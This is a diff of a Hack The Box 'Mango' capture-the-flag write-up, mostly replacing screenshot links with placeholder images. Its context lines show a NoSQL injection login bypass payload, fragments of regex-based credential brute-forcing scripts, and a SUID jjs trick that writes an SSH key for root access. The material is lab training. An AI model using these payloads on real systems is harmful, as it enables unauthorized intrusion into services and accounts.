@@ -17,14 +17,14 @@ Mango is a medium-difficulty Hack The Box machine that involves NoSQL injection,
 export target=10.129.229.185
 ```
 
-<img width="441" height="200" alt="image" src="https://github.com/user-attachments/assets/9811270a-7a72-4baf-94d4-990ba2adbb90" />
+<img width="441" height="200" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-1-Upload-To-Imgur" />
 
 #### Port Scan
 ```bash
 sudo nmap -p- --min-rate 5000 -sT -vvv $target
 ```
 
-<img width="897" height="734" alt="image" src="https://github.com/user-attachments/assets/11b75aa9-3f86-4d50-9652-d170b88491bc" />
+<img width="897" height="734" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-2-Upload-To-Imgur" />
 
 
 **Discovered Open Ports**:
@@ -37,7 +37,7 @@ sudo nmap -p- --min-rate 5000 -sT -vvv $target
 sudo nmap -p 22,80,443 -sC -sV -T4 $target
 ```
 
-<img width="954" height="544" alt="image" src="https://github.com/user-attachments/assets/5602bd7c-8645-4501-a6bb-eba7fb1f727a" />
+<img width="954" height="544" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-3-Upload-To-Imgur" />
 
 
 **Key Discovery**: The scan revealed `staging-order.mango.htb` as a virtual host.
@@ -48,7 +48,7 @@ Add to `/etc/hosts`:
 10.129.229.185 staging-order.mango.htb
 ```
 
-<img width="556" height="169" alt="image" src="https://github.com/user-attachments/assets/35733877-1cf9-45b1-b7dd-3bc567688509" />
+<img width="556" height="169" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-4-Upload-To-Imgur" />
 
 
 ---
@@ -59,7 +59,7 @@ Add to `/etc/hosts`:
 
 Visiting `http://staging-order.mango.htb` presents a login page. Traditional SQL injection attempts proved unsuccessful, leading to testing for NoSQL injection vulnerabilities.
 
-<img width="717" height="827" alt="image" src="https://github.com/user-attachments/assets/ed2abf5f-d5e1-43fe-80c8-a6bef1ddf805" />
+<img width="717" height="827" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-5-Upload-To-Imgur" />
 
 
 ### NoSQL Injection Exploitation
@@ -75,11 +75,11 @@ Content-Type: application/x-www-form-urlencoded
 username[$ne]=admin&password[$ne]=password&login=login
 ```
 
-<img width="592" height="505" alt="image" src="https://github.com/user-attachments/assets/e1a75505-36b1-4159-970e-285dad045692" />
+<img width="592" height="505" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-6-Upload-To-Imgur" />
 
 This payload successfully bypassed authentication, revealing the application was vulnerable to NoSQL injection.
 
-<img width="592" height="505" alt="image" src="https://github.com/user-attachments/assets/ca75f48e-3b9d-4f97-bb02-fdcbf3de3182" />
+<img width="592" height="505" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-7-Upload-To-Imgur" />
 
 
 #### Username Enumeration
@@ -121,9 +121,9 @@ if __name__ == "__main__":
 - `admin`
 - `mango`
 
-<img width="657" height="320" alt="image" src="https://github.com/user-attachments/assets/ae0cd350-0600-404a-9ec7-c5efad3e737e" />
+<img width="657" height="320" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-8-Upload-To-Imgur" />
 
-<img width="657" height="320" alt="image" src="https://github.com/user-attachments/assets/ee6d47e8-febf-4207-9a26-1a21ca81641e" />
+<img width="657" height="320" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-9-Upload-To-Imgur" />
 
 **Note:To bruteforce the usernames we are using the nosql injection I have just used the requests package and made a request to the website and with the payload ^{user_prefix+char} trying whether the username starts with a,b,c note that to get the username starting with m we need to call the function as brute_user("m") How did m appear as first letter is that we tested in burp the first character using sniper attack by using the payload as ^a,^b...^z the intruder sniper request is below**
 
@@ -165,9 +165,9 @@ if __name__ == "__main__":
     brute_pass("mango", "")
 ```
 
-<img width="412" height="208" alt="image" src="https://github.com/user-attachments/assets/a8ce1b95-9926-4ac0-a6e7-e87ed57619cc" />
+<img width="412" height="208" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-10-Upload-To-Imgur" />
 
-<img width="657" height="87" alt="image" src="https://github.com/user-attachments/assets/f35ecebb-d8a0-4ea2-81ea-7576ac1aeec0" />
+<img width="657" height="87" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-11-Upload-To-Imgur" />
 
 **Note:ignoring $ as it indicates the end char**
 
@@ -184,7 +184,7 @@ if __name__ == "__main__":
 ssh mango@10.129.229.185
 ```
 
-<img width="650" height="962" alt="image" src="https://github.com/user-attachments/assets/2f9f16c6-1317-4593-bb31-fcbbbf685deb" />
+<img width="650" height="962" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-12-Upload-To-Imgur" />
 
 
 ### User Enumeration
@@ -204,7 +204,7 @@ cat /home/admin/user.txt
 ```
 **User Flag**: `79dfb8a4808a30feb7d431d5f4a36380`
 
-<img width="571" height="283" alt="image" src="https://github.com/user-attachments/assets/82cc065d-0cfb-4189-ba6a-bdd78ef93d3e" />
+<img width="571" height="283" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-13-Upload-To-Imgur" />
 
 ### Privilege Escalation to Root
 
@@ -213,14 +213,14 @@ cat /home/admin/user.txt
 find / -type f -user root -perm -4000 -ls 2>/dev/null
 ```
 
-<img width="973" height="290" alt="image" src="https://github.com/user-attachments/assets/d998c13f-6966-4ecb-a95d-b98031c93969" />
+<img width="973" height="290" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-14-Upload-To-Imgur" />
 
 **Key Finding**: `jjs` (JavaScript engine) with SUID permissions owned by root.
 
 #### GTFOBins Exploitation
 Using `jjs` for file write operations:
 
-<img width="809" height="348" alt="image" src="https://github.com/user-attachments/assets/082bf88b-1809-493e-b849-a77dcde0a8f4" />
+<img width="809" height="348" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-15-Upload-To-Imgur" />
 
 
 ```javascript
@@ -230,7 +230,7 @@ fw.write("ssh-rsa AAAAB3NzaC1yc2E...");
 fw.close();' | jjs
 ```
 
-<img width="674" height="183" alt="image" src="https://github.com/user-attachments/assets/ae5da719-13cd-41bf-adec-acb9fa1d9789" />
+<img width="674" height="183" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-16-Upload-To-Imgur" />
 
 
 #### Root Access via SSH
@@ -244,7 +244,7 @@ cat /root/root.txt
 ```
 **Root Flag**: `679984d14402f6b0e0dccf1c1fe7b9ab`
 
-<img width="798" height="508" alt="image" src="https://github.com/user-attachments/assets/c3862faa-41ee-4821-bed1-c57d43a26e99" />
+<img width="798" height="508" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-17-Upload-To-Imgur" />
 
 ---
 
